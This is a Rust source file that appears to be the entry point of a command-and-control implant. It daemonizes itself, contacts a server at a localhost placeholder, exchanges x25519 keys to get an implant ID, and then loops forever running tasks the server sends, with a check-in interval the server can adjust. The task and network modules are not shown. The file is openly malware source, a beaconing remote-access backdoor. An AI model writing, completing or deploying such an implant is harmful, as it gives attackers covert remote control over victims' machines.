use daemonize::Daemonize;
use std::{thread, time};

// Mods
mod errors;
mod http;
mod models;
mod tasks;
mod utils;

// TODO: Move consts in config file
// Constants
pub const PROTOCOL: &str = "http";
pub const HOST: &str = "localhost";
pub const PORT: &str = "8080";

fn main() -> Result<(), errors::ImplantError> {
    Daemonize::new().start().unwrap();

    // Check if server is up and running
    http::connect::initial_connection()?;

    // Create x25519 keypair
    let keypair = utils::network_encryption::generate_keypair();

    // Exchange key information with server
    let exchange_response = http::exchange::exchange_keys(keypair.1)?;

    let mut check_in_time_secs: u64 = 60;
    loop {
        // Handle tasks
        let (is_default, temp) = tasks::task_handler::handle_available_tasks(
            &exchange_response.implant_id,
            &keypair.0,
            &exchange_response.public_key,
        )?;

        if !is_default {
            check_in_time_secs = temp;
        }

        // Sleep
        let check_in_duration = time::Duration::from_secs(check_in_time_secs);

        thread::sleep(check_in_duration);
    }
}
